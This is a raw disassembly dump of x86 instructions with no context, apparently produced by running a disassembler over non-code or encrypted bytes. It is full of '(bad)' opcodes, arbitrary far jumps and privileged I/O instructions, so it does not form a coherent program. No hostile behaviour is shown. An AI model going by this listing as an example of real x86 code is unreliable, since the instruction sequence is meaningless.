  41019e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019f:	xchg   ebp,eax
  4101a0:	inc    ebp
  4101a1:	mov    dh,BYTE PTR [eax-0x4e06d1c]
  4101a7:	jmp    0x7d6993a8
  4101ac:	arpl   WORD PTR [ebx],bx
  4101ae:	ret    
  4101af:	and    bh,BYTE PTR [edx+0x21b2d48f]
  4101b5:	xor    ecx,esi
  4101b7:	call   0xb46ea6d3
  4101bc:	rol    BYTE PTR [ecx+0x29f1a9bc],0x0
  4101c3:	cmc    
  4101c4:	mov    ss,edx
  4101c6:	jb     0x4101ef
  4101c8:	sbb    DWORD PTR ds:0x8b632a06,edx
  4101ce:	mov    dh,BYTE PTR [esp+ebp*1-0x27398e50]
  4101d5:	rol    BYTE PTR [eax+0x7d],0xc5
  4101d9:	(bad)  
  4101da:	sub    esp,DWORD PTR [esi-0x3c]
  4101dd:	call   0xb92c0553
  4101e2:	and    edi,esp
  4101e4:	gs dec edi
  4101e6:	test   BYTE PTR [edi+0x2318d6ed],ah
  4101ec:	adc    al,0xb3
  4101ee:	adc    DWORD PTR [esi-0x30],eax
  4101f1:	push   ss
  4101f2:	fucomp st(7)
  4101f4:	or     DWORD PTR [esi+0x6933e0dd],edx
  4101fa:	inc    ebp
  4101fb:	es mov edx,0x623682cb
  410201:	sub    BYTE PTR [edi],0xcd
  410204:	retf   
  410205:	jge    0x410224
  410207:	aad    0x32
  410209:	test   BYTE PTR [ebx],bl
  41020b:	mov    ds:0x41c8303c,eax
  410210:	dec    esi
  410211:	(bad)  
  410213:	adc    BYTE PTR [edx],ah
  410215:	pop    ss
  410216:	xor    al,0xa9
  410218:	push   es
  410219:	rcr    BYTE PTR [ebx],cl
  41021b:	das    
  41021c:	bound  ebp,QWORD PTR [ecx]
  41021e:	xor    dl,BYTE PTR [edi]
  410220:	test   BYTE PTR [ebx+0x79],0x77
  410224:	lock add al,0x77
  410227:	sbb    al,0x0
  410229:	aad    0x9c
  41022b:	add    bl,BYTE PTR [ebp-0x3d]
  41022e:	call   0x502:0x852cd246
  410235:	pop    ds
  410236:	rol    ebp,0xf1
  410239:	cmp    DWORD PTR [edi-0x5b],eax
  41023c:	out    dx,al
  41023d:	ja     0x410295
  41023f:	mov    al,0x69
  410241:	jmp    0x234f:0x2bb86740
  410248:	sub    ch,BYTE PTR [eax+edx*1-0x39e20743]
  41024f:	mov    bl,0x6e
  410251:	ins    DWORD PTR es:[edi],dx
  410252:	out    0x23,eax
  410254:	int3   
  410255:	push   eax
  410256:	adc    DWORD PTR [eax-0x1e27b602],0x1f
  41025d:	popa   
  41025e:	sub    al,0xf2
  410260:	pushf  
  410261:	fld    TBYTE PTR [edx]
  410263:	and    BYTE PTR [eax-0x7],bh
  410266:	inc    edx
  410267:	data16 cmp al,0x75
  41026a:	jb     0x41029a
  41026c:	mov    DWORD PTR [edi+0x779ab89f],esp
  410272:	adc    esp,edx
  410274:	jb     0x410268
  410276:	rol    DWORD PTR [edx-0x6c],1
  410279:	(bad)  
  41027a:	hlt    
  41027b:	in     al,0x3f
  41027d:	add    edx,DWORD PTR [esi]
  41027f:	push   esi
  410280:	mov    edi,0x2ec588d3
  410285:	test   al,0x7
  410287:	sub    DWORD PTR [ebx+0x6f],ecx
  41028a:	cmp    dh,BYTE PTR [ecx+0x4d]
  41028d:	lock loopne 0x410217
  410290:	(bad)  
  410291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410292:	sub    esi,edi
  410294:	test   al,0x21
  410296:	mov    ds:0x37965e4a,al
  41029b:	mov    ds:0x8c2f9ec2,al
  4102a0:	push   0x475e87e5
  4102a5:	jmp    0x17817e0c
  4102aa:	ins    DWORD PTR es:[edi],dx
  4102ab:	call   0xbc0d6939
  4102b0:	dec    esp
  4102b1:	xchg   edi,eax
  4102b2:	test   DWORD PTR [edx-0x7e],edi
  4102b5:	fnstenv [edi-0x26]
  4102b8:	jle    0x41029b
  4102ba:	jmp    0x4102b1
  4102bc:	push   ecx
  4102bd:	dec    edx
  4102be:	xlat   BYTE PTR ds:[ebx]
  4102bf:	cs xchg ebp,eax
  4102c1:	add    esi,DWORD PTR [ecx-0x3de8c548]
  4102c7:	jo     0x410273
  4102c9:	push   es
  4102ca:	call   0xecb49bdd
  4102cf:	test   al,0xa7
  4102d1:	add    eax,0xe70a3d65
  4102d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d7:	push   cs
  4102d8:	pushf  
  4102d9:	push   es
  4102da:	inc    esi
  4102db:	test   eax,0xa3f4c6f3
  4102e0:	lds    edi,FWORD PTR [edx+eax*1+0x12027f1b]
  4102e7:	(bad)  
  4102e8:	not    BYTE PTR ds:0xaed43f7
  4102ee:	push   ss
  4102ef:	mov    esp,0xfafbbcf4
  4102f4:	add    ah,BYTE PTR [ecx+0x2d27765b]
  4102fa:	or     BYTE PTR [ecx],al
  4102fc:	outs   dx,BYTE PTR ds:[esi]
  4102fd:	xchg   BYTE PTR [ecx+0x28],ch
  410300:	cmp    cl,BYTE PTR [ecx-0x73456ba9]
  410306:	aad    0xee
  410308:	test   al,0xab
  41030a:	sub    ch,BYTE PTR [ebp-0x3d]
  41030d:	adc    ecx,DWORD PTR [esi-0xa]
  410310:	adc    al,cl
  410312:	repnz in ax,0x7d
  410316:	xor    BYTE PTR [edx-0x3e],0x21
  41031a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41031c:	jle    0x410311
  41031e:	aas    
  41031f:	xchg   ecx,eax
  410320:	mov    eax,ds:0xb17b7ecc
  410325:	add    edi,eax
  410327:	call   0xd8ccc8da
  41032c:	or     al,0x90
  41032e:	adc    cl,ch
  410330:	(bad)  
  410331:	stc    
  410332:	je     0x410301
  410334:	inc    esi
  410335:	ins    BYTE PTR es:[edi],dx
  410336:	cmp    BYTE PTR [ecx],bh
  410338:	jl     0x41039c
  41033a:	ja     0x4102cd
  41033c:	jmp    0xc6f30eb9
  410341:	xchg   BYTE PTR [ebx+0x6b],ch
  410344:	popa   
  410345:	call   0xa063:0x5a1ba6da
  41034c:	retf   
  41034d:	or     BYTE PTR [edx+0x77157414],bl
  410353:	lea    edx,[esi-0x19]
  410356:	popf   
  410357:	shl    ebp,0xf2
  41035a:	cmp    eax,0xc1529a17
  41035f:	push   esi
  410360:	ja     0x4103b5
  410362:	pop    esi
  410363:	adc    cl,BYTE PTR [ecx-0x5e]
  410366:	mov    ch,0xc6
  410368:	test   al,0x8b
  41036a:	in     al,0x75
  41036c:	sub    BYTE PTR [esi+0x79],cl
  41036f:	das    
  410370:	add    DWORD PTR [ebp+eax*1-0x35],ebp
  410374:	repnz retf 0xfeb4
  410378:	ja     0x4103ba
  41037a:	retf   
  41037b:	test   al,0x7d
  41037d:	and    dl,ch
  41037f:	in     al,dx
  410380:	mov    bl,0xc5
  410382:	(bad)  
  410383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410384:	stos   BYTE PTR es:[edi],al
  410385:	push   ebp
  410386:	and    dh,al
  410388:	ret    
  410389:	sbb    ah,0x34
  41038c:	pop    ds
  41038d:	clc    
  41038e:	in     eax,dx
  41038f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410390:	test   al,0x88
  410392:	in     al,dx
  410393:	push   esp
  410394:	add    DWORD PTR [eax+0x4],eax
  410397:	xchg   ecx,eax
  410398:	lds    eax,FWORD PTR ds:0x992d0b30
  41039e:	shl    DWORD PTR [ebx],0x5
  4103a1:	cmc    
  4103a2:	or     edi,DWORD PTR [ecx-0x2d]
  4103a5:	push   ebp
  4103a6:	test   DWORD PTR [ebp+0x8e764ba],edi
  4103ac:	fmul   DWORD PTR [ebx+ecx*4+0x4f]
  4103b0:	mov    cl,0x16
  4103b2:	pminsw mm0,mm2
  4103b5:	xor    al,0xea
  4103b7:	inc    edx
  4103b8:	or     BYTE PTR [ecx-0x14a6bdaf],ah
  4103be:	out    dx,eax
  4103bf:	jmp    0x20aa5066
  4103c4:	aaa    
  4103c5:	xchg   ecx,eax
  4103c6:	mov    ecx,0xe4cef5ee
  4103cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103cc:	add    BYTE PTR [edx-0x1c],0xc8
  4103d0:	inc    edi
  4103d1:	stos   DWORD PTR es:[edi],eax
  4103d2:	ret    
  4103d3:	retf   
  4103d4:	inc    ecx
  4103d5:	xor    DWORD PTR [edx],edx
  4103d7:	mov    ebp,0x2d60211f
  4103dc:	fdivr  DWORD PTR [eax+0xbe7b67a]
  4103e2:	sar    DWORD PTR [ebx+0xfc5e1e5],0xc
  4103e9:	inc    esp
  4103ea:	dec    ebx
  4103eb:	push   esp
  4103ec:	add    DWORD PTR [ecx+0x7f],esp
  4103ef:	inc    ch
  4103f1:	mov    bh,0x10
  4103f3:	and    ebp,DWORD PTR [ecx]
  4103f5:	sbb    ebp,DWORD PTR [edx]
  4103f7:	hlt    
  4103f8:	addr16 jge 0x4103a0
  4103fb:	scas   al,BYTE PTR es:[edi]
  4103fc:	aaa    
  4103fd:	fld    TBYTE PTR [edi+0x2f]
  410400:	mov    ebp,0xca2f29e3
  410405:	pop    eax
  410406:	sub    DWORD PTR [ebp-0x28b63a43],0x92902147
  410410:	cmp    bl,BYTE PTR [ecx]
  410412:	iret   
  410413:	sbb    DWORD PTR ds:0xe0679d5d,ebx
  410419:	scas   eax,DWORD PTR es:[edi]
  41041a:	add    ebx,eax
  41041c:	push   cs
  41041d:	dec    esp
  41041e:	pop    ecx
  41041f:	inc    esi
  410420:	fndisi(8087 only) 
  410422:	ins    BYTE PTR es:[edi],dx
  410423:	(bad)  
  410424:	push   edi
  410425:	or     eax,0xb4e9fa8c
  41042a:	sbb    BYTE PTR [ebp-0x5115b35],ch
  410430:	enter  0x41d4,0x11
  410434:	bound  eax,QWORD PTR [edx]
  410436:	popf   
  410437:	test   esi,edx
  410439:	out    0xd2,al
  41043b:	adc    BYTE PTR [esp+ebx*2+0x10],dh
  41043f:	sub    BYTE PTR [ecx+eiz*1+0x70cd07d5],0x38
  410447:	jg     0x410446
  410449:	scas   al,BYTE PTR es:[edi]
  41044a:	add    al,BYTE PTR [ebx+ebx*8+0x784af72a]
  410451:	fistp  QWORD PTR [ecx-0x42563628]
  410457:	dec    esi
  410458:	ins    DWORD PTR es:[edi],dx
  410459:	sub    DWORD PTR [ebx-0x2581d8b2],0xf7e5031f
  410463:	stc    
  410464:	mov    esi,0xc05deb63
  410469:	xchg   edi,eax
  41046a:	jp     0x410454
  41046c:	push   ss
  41046d:	add    ah,cl
  41046f:	(bad)  
  410470:	outs   dx,BYTE PTR ds:[esi]
  410471:	bound  ebx,QWORD PTR [edi-0x4f]
  410474:	xor    DWORD PTR [ecx-0x31ff5932],ebx
  41047a:	loope  0x41049b
  41047c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41047e:	icebp  
  41047f:	fcom   st(5)
  410481:	jecxz  0x410446
  410483:	in     eax,0x43
  410485:	mov    eax,DWORD PTR [ecx+0x46]
  410488:	loopne 0x41047b
  41048a:	cmp    eax,0x29fc0daf
  41048f:	mov    ecx,0x15f44510
  410494:	cwde   
  410495:	loope  0x41048d
  410497:	(bad)  
  410498:	imul   ebx,DWORD PTR [edi],0xffffffcb
  41049b:	fcom   st(1)
  41049d:	in     al,0x22
  41049f:	sub    ch,dl
  4104a1:	(bad)  
  4104a2:	sbb    BYTE PTR [edi+0x28136106],ch
  4104a8:	jmp    0xd8344a3a
  4104ad:	aad    0xc6
  4104af:	test   al,0xdc
  4104b1:	ret    
  4104b2:	mov    al,0x9f
  4104b4:	rcr    DWORD PTR [edi],cl
  4104b6:	dec    edx
  4104b7:	inc    esi
  4104b8:	scas   eax,DWORD PTR es:[edi]
  4104b9:	adc    BYTE PTR [ecx-0x276bc130],0x5a
  4104c0:	stc    
  4104c1:	dec    ebx
  4104c2:	dec    esp
  4104c3:	push   ebp
  4104c4:	fild   DWORD PTR [esi-0x24]
  4104c7:	mov    ah,0xa
  4104c9:	push   ebx
  4104ca:	pop    ecx
  4104cb:	jmp    0x34831e83
  4104d0:	js     0x4104b5
  4104d2:	mov    ecx,0xd464d1f4
  4104d7:	out    dx,al
  4104d8:	(bad)  
  4104d9:	lwpval esi,DWORD PTR [ebp-0x5e19ba01],0x1d82fa01
  4104e6:	push   edx
  4104e7:	mov    edx,0x541344e4
  4104ec:	stos   BYTE PTR es:[edi],al
  4104ed:	push   esp
  4104ee:	dec    BYTE PTR [ecx+0x54]
  4104f1:	int    0xad
  4104f3:	inc    edx
  4104f4:	cmp    ebx,edi
  4104f6:	pop    edi
  4104f7:	push   ds
  4104f8:	pop    ebx
  4104f9:	adc    al,0xfa
  4104fb:	(bad)  
  4104fc:	xor    eax,0xc3a3c7f7
  410501:	add    esi,DWORD PTR [edi+ebx*4]
  410504:	ins    BYTE PTR es:[edi],dx
  410505:	sub    BYTE PTR [eax-0x7f57ff44],ah
  41050b:	mov    ebp,ecx
  41050d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41050e:	in     eax,0x5e
  410510:	mov    ds:0x6f4fa0f6,eax
  410515:	sub    eax,0x72e42b81
  41051a:	dec    esp
  41051b:	xor    al,dh
  41051d:	dec    ebx
  41051e:	dec    eax
  41051f:	das    
  410520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410521:	cmp    al,0xf0
  410523:	ja     0x410553
  410525:	jnp    0x410516
  410527:	scas   eax,DWORD PTR es:[edi]
  410528:	ror    DWORD PTR [esi+0x57],0x9e
  41052c:	sbb    cl,BYTE PTR [esi]
  41052e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41052f:	adc    ch,bh
  410531:	test   al,0x44
  410533:	mov    bl,0x9a
  410535:	xchg   DWORD PTR [esi-0x44],edi
  410538:	adc    ah,BYTE PTR [esi-0x2b]
  41053b:	cmp    ecx,ebp
  41053d:	inc    ebp
  41053e:	xor    BYTE PTR [edx-0x4f],al
  410541:	addr16 mov dh,0x22
  410544:	cdq    
  410545:	or     al,0x20
  410547:	mov    al,0xd9
  410549:	rcl    DWORD PTR [esi],1
  41054b:	fnstcw WORD PTR [ebx+0x36]
  41054e:	push   ebp
  41054f:	stos   BYTE PTR es:[edi],al
  410550:	std    
  410551:	stc    
  410552:	aam    0xea
  410554:	ror    esi,cl
  410556:	lea    edx,[eax-0x4]
  410559:	add    ebp,eax
  41055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41055c:	int    0x55
  41055e:	mov    BYTE PTR [ebx-0x2d585ee7],al
  410564:	aad    0xc6
  410566:	sbb    ecx,DWORD PTR [ebp+0x3b2bedec]
  41056c:	stos   BYTE PTR es:[edi],al
  41056d:	call   0x532:0x7f6cf94
  410574:	jno    0x4104fa
  410576:	retf   0x9e11
  410579:	js     0x410532
  41057b:	jbe    0x41055b
  41057d:	pop    ss
  41057e:	in     al,0x49
  410580:	xchg   esp,ebx
  410582:	push   es
  410583:	jmp    0x76b064f
  410588:	aaa    
  410589:	mov    ds:0xf20c785a,al
  41058e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058f:	mov    ds:0x46545d9e,al
  410594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410595:	lods   eax,DWORD PTR ds:[esi]
  410596:	cdq    
  410597:	xor    eax,0x7cba890a
  41059c:	jae    0x410589
  41059e:	dec    eax
  41059f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105a0:	push   0x6e
  4105a2:	outs   dx,BYTE PTR ds:[esi]
  4105a3:	jne    0x4105dd
  4105a5:	imul   ecx,DWORD PTR [ecx+0x1c],0x44
  4105a9:	in     eax,0xeb
  4105ab:	sbb    DWORD PTR [edx],eax
  4105ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ae:	int3   
  4105af:	rol    bh,1
  4105b1:	pushf  
  4105b2:	push   ds
  4105b3:	jecxz  0x4105de
  4105b5:	div    al
  4105b7:	xor    eax,esi
  4105b9:	xchg   esi,eax
  4105ba:	mov    bl,0xd6
  4105bc:	sbb    al,0x14
  4105be:	bound  esi,QWORD PTR [edx-0x1f9c737b]
  4105c4:	sub    eax,0x3746ad
  4105c9:	jns    0x4105d6
  4105cb:	addr16 cs pop ss
  4105ce:	fucomi st,st(0)
  4105d0:	test   DWORD PTR [edx+0x1ebc9b02],0xbbecbfc4
  4105da:	and    ebx,edx
  4105dc:	xor    ebp,DWORD PTR [edi-0x3f]
  4105df:	jmp    0x12aa:0xf5db80f0
  4105e6:	push   edx
  4105e7:	or     BYTE PTR [ebx],bh
  4105e9:	or     eax,0x9b3c6104
  4105ee:	aam    0xea
  4105f0:	test   DWORD PTR [edx+0x2127113d],0xe2e84519
  4105fa:	nop
  4105fb:	jnp    0x41062a
  4105fd:	pop    edi
  4105fe:	lods   al,BYTE PTR ds:[esi]
  4105ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410600:	or     ebx,DWORD PTR [edx]
  410602:	dec    ecx
  410603:	not    DWORD PTR [esi*2+0x5fb2d6d]
  41060a:	pop    esi
  41060b:	mov    ebp,0x16981a9d
  410610:	les    ebx,FWORD PTR [edi+0x592d2aa7]
  410616:	pop    DWORD PTR [edi]
  410618:	mov    cl,0xaf
  41061a:	jae    0x4105d9
  41061c:	test   BYTE PTR [ecx],dl
  41061e:	fidivr DWORD PTR [ebx]
  410620:	seta   ch
  410623:	sbb    al,0xf9
  410625:	mov    eax,ds:0x824cef7e
  41062a:	xlat   BYTE PTR ds:[ebx]
  41062b:	jbe    0x410615
  41062d:	fwait
  41062e:	cmp    eax,0x5000e68a
  410633:	mov    al,0x44
  410635:	test   DWORD PTR [ebx+ecx*4],0x43e73e13
  41063c:	rcl    al,1
  41063e:	or     BYTE PTR [edx+ebx*8],bl
  410641:	out    dx,eax
  410642:	pop    ds
  410643:	stos   DWORD PTR es:[edi],eax
  410644:	jno    0x4105cd
  410646:	push   edx
  410647:	mov    ecx,0xa4212972
  41064c:	bound  edi,QWORD PTR ds:0x7ef0abf6
  410652:	mov    ebx,0x774538e3
  410657:	(bad)  
  410658:	xor    al,0x52
  41065a:	xchg   esi,eax
  41065b:	adc    DWORD PTR [esi],eax
  41065d:	adc    BYTE PTR [eax+0xb9071af],ah
  410663:	test   DWORD PTR [ecx],eax
  410665:	mov    esp,0x44818fc6
  41066a:	int    0x6d
  41066c:	push   ebp
  41066d:	aad    0x17
  41066f:	sub    al,0x70
  410671:	jle    0x410694
  410673:	xchg   BYTE PTR [edx-0x3e],ah
  410676:	xchg   edx,eax
  410677:	sbb    DWORD PTR [edx+0x327ecbb9],0xa54588d7
  410681:	jnp    0x4106b0
  410683:	test   BYTE PTR [edx],ah
  410685:	fst    DWORD PTR [edi-0x9]
  410688:	stos   BYTE PTR es:[edi],al
  410689:	data16 jo 0x410702
  41068c:	push   edx
  41068d:	xor    edx,ecx
  41068f:	mov    bl,0xd2
  410691:	or     BYTE PTR [esi-0x77f54421],dl
  410697:	pop    eax
  410698:	das    
  410699:	cdq    
  41069a:	and    cl,dh
  41069c:	mov    ds:0x549df26c,eax
  4106a1:	sub    DWORD PTR [esi],0x7ac962f0
  4106a7:	(bad)  
  4106a8:	cli    
  4106a9:	xchg   DWORD PTR [esi-0x1c],edx
  4106ac:	mov    cl,0x8f
  4106ae:	push   ebp
  4106af:	lods   al,BYTE PTR ds:[esi]
  4106b0:	mov    bh,0x13
  4106b2:	inc    ecx
  4106b3:	sti    
  4106b4:	mov    bl,BYTE PTR [eax-0x68839707]
  4106ba:	ins    BYTE PTR es:[edi],dx
  4106bb:	xchg   esp,eax
  4106bc:	mov    esi,0xa86ca97b
  4106c1:	or     al,0xf8
  4106c3:	rcl    ecx,1
  4106c5:	sbb    eax,DWORD PTR [edx-0x26]
  4106c8:	mov    DWORD PTR ds:0xdaf784b9,esp
  4106ce:	in     al,0x16
  4106d0:	mov    esi,0xfb9763d4
  4106d5:	das    
  4106d6:	stos   BYTE PTR es:[edi],al
  4106d7:	ficomp WORD PTR [eax]
  4106d9:	push   ebp
  4106da:	retf   
  4106db:	sub    ch,al
  4106dd:	rcl    ah,0x93
  4106e0:	lock add eax,0xad56c583
  4106e6:	sbb    esp,esi
  4106e8:	loope  0x4106a5
  4106ea:	loope  0x4106bc
  4106ec:	jecxz  0x410759
  4106ee:	push   ss
  4106ef:	mov    BYTE PTR [edi],0x8d
  4106f2:	xchg   BYTE PTR [ebp+0x57],bh
  4106f5:	sbb    al,0x16
  4106f7:	mov    WORD PTR [esi],ds
  4106f9:	out    0x63,eax
  4106fb:	push   cs
  4106fc:	or     eax,0x966b0420
  410701:	retf   
  410702:	retf   0xfbe1
  410705:	jecxz  0x41068b
  410707:	daa    
  410708:	or     al,0xb9
  41070a:	inc    edx
  41070b:	mov    dl,BYTE PTR [ebx-0x5916092c]
  410711:	fcom   QWORD PTR [ebx+0x5e90543e]
  410717:	in     al,dx
  410718:	stc    
  410719:	ins    DWORD PTR es:[edi],dx
  41071a:	out    0x9d,eax
  41071c:	retf   0xc65b
  41071f:	mov    al,0x67
  410721:	test   DWORD PTR [ecx+ecx*8+0x2],ebx
  410725:	popa   
  410726:	lock (bad) 
  410728:	(bad)  
  410729:	call   0x4740:0x4b838cae
  410730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410731:	sti    
  410732:	jae    0x41078b
  410734:	repnz adc DWORD PTR [edx-0x215b6f66],esi
  41073b:	pusha  
  41073c:	xor    DWORD PTR [edx+0x6d],esp
  41073f:	and    ebp,DWORD PTR [esi+0x657ba220]
  410745:	xor    bh,dh
  410747:	xchg   ebp,eax
  410748:	pop    ebp
  410749:	out    0xf5,eax
  41074b:	loopne 0x41078e
  41074d:	out    0xd2,eax
  41074f:	lds    esi,FWORD PTR ds:0x64b58fab
  410755:	mov    ds:0xf19c9871,al
  41075a:	js     0x41071c
  41075c:	out    dx,eax
  41075d:	or     eax,0x1d0b78a
  410762:	xor    esp,edx
  410764:	dec    ecx
  410765:	xor    edx,esp
  410767:	fwait
  410768:	dec    edi
  410769:	pop    esp
  41076a:	mov    dl,0x51
  41076c:	daa    
  41076d:	jbe    0x410799
  41076f:	out    0x3c,al
  410771:	push   edx
  410772:	sub    DWORD PTR [ebx-0x38492199],edi
  410778:	loop   0x410745
  41077a:	rol    DWORD PTR [eax+ecx*8-0x49331189],cl
  410781:	into   
  410782:	jno    0x4107e4
  410784:	inc    ecx
  410785:	pop    esi
  410786:	jo     0x4107fc
  410788:	cwde   
  410789:	mov    ecx,0x977d223b
  41078e:	and    edx,0xfffffff2
  410791:	stos   DWORD PTR es:[edi],eax
  410792:	ret    
  410793:	mov    bl,0x7c
  410795:	and    ecx,esi
  410797:	cld    
  410798:	test   BYTE PTR [eax+eiz*1+0x5a56e3bf],ch
  41079f:	inc    esi
  4107a0:	xchg   edx,eax
  4107a1:	gs test eax,ecx
  4107a4:	push   es
  4107a5:	push   ss
  4107a6:	mov    esi,0x33a55fd7
  4107ab:	sar    DWORD PTR [edx+eax*2+0x73],1
  4107af:	popa   
  4107b0:	out    dx,eax
  4107b1:	mov    WORD PTR [ebp+eiz*8-0x1b254ffd],?
  4107b8:	jl     0x41074b
  4107ba:	adc    DWORD PTR [ecx+0x2e5fb130],edi
  4107c0:	(bad)  
  4107c1:	mov    esp,0x1d54b17c
  4107c6:	push   eax
  4107c7:	test   al,0x67
  4107c9:	std    
  4107ca:	jo     0x41082d
  4107cc:	nop
  4107cd:	xchg   al,dl
  4107cf:	sub    ebx,0x3a
  4107d2:	sub    ebx,DWORD PTR [esi+eax*1-0x1d]
  4107d6:	xor    esp,ebp
  4107d8:	sub    al,0x97
  4107da:	fs mov cl,0x31
  4107dd:	(bad)
  4107e0:	sbb    dh,cl
  4107e2:	xor    ebp,edx
  4107e4:	dec    ecx
  4107e5:	or     ecx,eax
  4107e7:	mov    esi,0xaf389426
  4107ec:	ins    BYTE PTR es:[edi],dx
  4107ed:	mov    dl,0xc8
  4107ef:	sahf   
  4107f0:	rcr    esi,1
  4107f2:	loope  0x4107b2
  4107f4:	xor    esp,DWORD PTR [edi-0x2]
  4107f7:	(bad)  
  4107f8:	push   edi
  4107f9:	lahf   
  4107fa:	retf   
  4107fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107fc:	jbe    0x4107dc
  4107fe:	or     edi,DWORD PTR [edi+0x57aeea3c]
  410804:	dec    esp
  410805:	xchg   esi,eax
  410806:	lahf   
  410807:	das    
  410808:	popa   
  410809:	repz fnstenv fs:0xf2ba4f1a
  410811:	push   edx
  410812:	add    eax,0xefc505f8
  410817:	push   0xb5087bf8
  41081c:	or     BYTE PTR [ebx],cl
  41081e:	(bad)  
  41081f:	mov    ?,WORD PTR [edx+0x514118e5]
  410825:	repz sub DWORD PTR [ebx+0x771bcb33],ecx
  41082c:	sub    eax,0xe146a779
  410831:	dec    ebp
  410832:	cdq    
  410833:	sub    DWORD PTR [ebx],ebp
  410835:	lods   eax,DWORD PTR ds:[esi]
  410836:	lahf   
  410837:	push   0xfffffff3
  410839:	adc    edi,DWORD PTR [eax]
  41083b:	push   esi
  41083c:	mov    BYTE PTR [edx+ecx*4+0x3],dl
  410840:	popf   
  410841:	idiv   dh
  410843:	pop    edi
  410844:	rol    ebp,0x84
  410847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410848:	jmp    DWORD PTR [edx-0x781afabf]
  41084e:	push   0x7a87a5cf
  410853:	xor    DWORD PTR [ecx+0x42],esi
  410856:	xor    BYTE PTR [esi+0x69377883],cl
  41085c:	jmp    0x3482:0x72ea9896
  410863:	pop    ebx
  410864:	fmul   DWORD PTR [ecx]
  410866:	into   
  410867:	call   0xfaf7dca8
  41086c:	xchg   DWORD PTR [eax+0x0],esp
  41086f:	cmc    
  410870:	ret    0xf373
  410873:	mov    ch,0x3a
  410875:	sbb    DWORD PTR [edi+0x397bde8f],0xffffff87
  41087c:	fimul  WORD PTR [ebx-0x53]
  41087f:	pushf  
  410880:	vpshad ymm14,[eax],xmm1
  410885:	xchg   edi,eax
  410886:	jge    0x4108d5
  410888:	sub    cl,BYTE PTR [ecx+0x1e331116]
  41088e:	sbb    dh,ch
  410890:	nop
  410891:	push   es
  410892:	mov    dh,0x27
  410894:	mov    BYTE PTR [ecx],bl
  410896:	outs   dx,BYTE PTR ds:[esi]
  410897:	add    DWORD PTR [eax-0x1d701830],ebx
  41089d:	pop    ds
  41089e:	jg     0x41089e
  4108a0:	pop    edi
  4108a1:	add    DWORD PTR ds:0x6467b348,0x797745f2
  4108ab:	cli    
  4108ac:	call   0xcc93:0x1a98a71c
  4108b3:	or     ebp,DWORD PTR [edx+0x1a]
  4108b6:	(bad)  
  4108b7:	cld    
  4108b8:	push   edx
  4108b9:	jle    0x41087b
  4108bb:	ret    
  4108bc:	das    
  4108bd:	neg    esi
  4108bf:	jle    0x41084b
  4108c1:	aas    
  4108c2:	dec    ebp
  4108c3:	repnz cmp esp,ebp
  4108c6:	mov    ecx,?
  4108c8:	shl    dl,cl
  4108ca:	jl     0x4108b5
  4108cc:	repnz sar DWORD PTR [edx+edi*1+0x52],0xec
  4108d2:	in     al,0xee
  4108d4:	sub    al,0x56
  4108d6:	add    BYTE PTR [edx-0xa6305],al
  4108dc:	lock mov bh,0xee
  4108df:	cwde   
  4108e0:	idiv   edx
  4108e2:	add    ebp,ebx
  4108e4:	iret   
  4108e5:	push   edi
  4108e6:	sbb    al,0x12
  4108e8:	call   0xb0476f79
  4108ed:	(bad)  
  4108ee:	retf   
  4108ef:	retf   0xc877
  4108f2:	pop    DWORD PTR [eax-0x57f1f565]
  4108f8:	sub    ah,BYTE PTR [ecx-0x3c7dca3d]
  4108fe:	out    0xcd,al
  410900:	mov    BYTE PTR [edi+0x4570a3eb],0x93
  410907:	fs mov ecx,0x2e23b4fd
  41090d:	mul    DWORD PTR [ebp+0xdfc9350]
  410913:	lock sub BYTE PTR [edi],ch
  410916:	dec    eax
  410917:	jbe    0x41095d
  410919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091a:	mov    al,0x98
  41091c:	ins    BYTE PTR es:[edi],dx
  41091d:	mov    al,ds:0x8d9b8427
  410922:	pop    ebx
  410923:	sbb    eax,0x98974a66
  410928:	add    cl,BYTE PTR [ebx+eax*1-0xb]
  41092c:	add    eax,0xbfb735e7
  410931:	ret    
  410932:	sub    al,0xe2
  410934:	jle    0x4108ca
  410936:	xor    al,0x6d
  410938:	test   DWORD PTR [edx],esp
  41093a:	add    esp,DWORD PTR [esi+0x365b29c4]
  410940:	or     BYTE PTR [esi+0x11e8c4a0],al
  410946:	out    0xa5,al
  410948:	das    
  410949:	mov    eax,ebx
  41094b:	arpl   dx,ax
  41094d:	in     al,0x6e
  41094f:	mov    ebp,0xaf06236a
  410954:	test   al,0xca
  410956:	repz and BYTE PTR [edi-0x34],dh
  41095a:	es sub eax,0x4b59d01f
  410960:	fmul   DWORD PTR [ebp+ecx*8-0x7960e1fb]
  410967:	jmp    0xe5fc15d4
  41096c:	xor    DWORD PTR [edi-0x2e],0xf0e9fc9e
  410973:	clc    
  410974:	fld    TBYTE PTR [ebx+edx*8+0x3f522250]
  41097b:	pop    ss
  41097c:	sub    ebp,DWORD PTR [ebx-0x144c7130]
  410982:	and    al,0xf5
  410984:	in     eax,0xeb
  410986:	outs   dx,BYTE PTR ds:[esi]
  410987:	(bad)  
  410988:	call   0x23e3c4c9
  41098d:	call   0xed4b:0xd70a5792
  410994:	mov    al,ds:0xee9536b3
  410999:	mov    bl,0x50
  41099b:	in     eax,0xc0
  41099d:	cmp    eax,0xd3980f0a
